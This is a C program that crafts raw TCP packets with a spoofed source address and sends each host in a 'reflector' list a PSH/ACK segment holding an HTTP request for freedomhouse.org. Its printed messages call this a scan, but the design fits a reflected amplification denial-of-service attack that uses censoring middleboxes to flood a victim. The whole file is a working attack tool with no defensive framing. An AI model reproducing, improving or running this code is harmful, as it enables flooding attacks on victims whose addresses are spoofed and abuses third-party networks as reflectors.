#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <time.h>

#define MAX_PACKET 4096

struct pseudo_header {
    unsigned int src_addr;
    unsigned int dst_addr;
    unsigned char placeholder;
    unsigned char protocol;
    unsigned short tcp_length;
};

typedef struct {
    char ip[64];
    int port;
    struct sockaddr_in sin;
} TargetInfo;

TargetInfo targets[MAX_PACKET];
int target_count = 0;

const char *payload = "GET / HTTP/1.1\r\nHost: freedomhouse.org\r\n\r\n";

unsigned short checksum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((u_char *)&oddbyte) = *(u_char *)ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short)~sum;
    return answer;
}

void load_targets(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("open file error");
        exit(1);
    }

    char line[256];
    while (fgets(line, sizeof(line), file)) {
        if (target_count >= MAX_PACKET) break;

        char *ip = strtok(line, ":");
        char *port_str = strtok(NULL, "\n");

        if (ip && port_str) {
            TargetInfo *t = &targets[target_count];
            strcpy(t->ip, ip);
            t->port = atoi(port_str);
            t->sin.sin_family = AF_INET;
            t->sin.sin_port = htons(t->port);
            t->sin.sin_addr.s_addr = inet_addr(t->ip);
            target_count++;
        }
    }

    fclose(file);
}

void build_and_send_packet(int sock, const char *src_ip, int src_port, TargetInfo *target) {
    char packet[1500];
    memset(packet, 0, sizeof(packet));

    struct iphdr *iph = (struct iphdr *)packet;
    struct tcphdr *tcph = (struct tcphdr *)(packet + sizeof(struct iphdr));
    char *data = packet + sizeof(struct iphdr) + sizeof(struct tcphdr);

    memcpy(data, payload, strlen(payload));
    int payload_len = strlen(payload);

    // IP头
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = inet_addr(src_ip);
    iph->daddr = inet_addr(target->ip);
    iph->check = 0;

    // TCP头
    tcph->source = htons(src_port);
    tcph->dest = htons(target->port);
    tcph->seq = htonl(rand());
    tcph->ack_seq = htonl(rand());
    tcph->doff = sizeof(struct tcphdr) / 4;
    tcph->fin = 0;
    tcph->syn = 0;
    tcph->rst = 0;
    tcph->psh = 1;
    tcph->ack = 1;
    tcph->urg = 0;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    // 计算 IP校验和
    iph->check = checksum((unsigned short *)packet, iph->ihl * 4);

    // 计算 TCP校验和
    struct pseudo_header psh;
    psh.src_addr = iph->saddr;
    psh.dst_addr = iph->daddr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_TCP;
    psh.tcp_length = htons(sizeof(struct tcphdr) + payload_len);

    int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + payload_len;
    char *pseudogram = malloc(psize);

    memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header), tcph, sizeof(struct tcphdr) + payload_len);

    tcph->check = checksum((unsigned short *)pseudogram, psize);
    free(pseudogram);

    sendto(sock, packet, sizeof(struct iphdr) + sizeof(struct tcphdr) + payload_len, 0,
           (struct sockaddr *)&target->sin, sizeof(struct sockaddr_in));
}

int main(int argc, char *argv[]) {
    if (argc != 4) {
        printf("Usage: %s <src_ip> <src_port> <reflector_file>\n", argv[0]);
        return 1;
    }

    printf("Scan Mode: src_ip=%s src_port=%s reflectors=%s\n", argv[1], argv[2], argv[3]);

    const char *src_ip = argv[1];
    int src_port = atoi(argv[2]);
    const char *reflector_file = argv[3];

    srand(time(NULL));

    load_targets(reflector_file);

    if (target_count == 0) {
        printf("No targets loaded.\n");
        return 1;
    }

    int sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sock < 0) {
        perror("socket");
        return 1;
    }

    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("setsockopt");
        close(sock);
        return 1;
    }

    for (int i = 0; i < target_count; i++) {
        build_and_send_packet(sock, src_ip, src_port, &targets[i]);
    }

    close(sock);

    printf("Scan finished.\n");

    return 0;
}
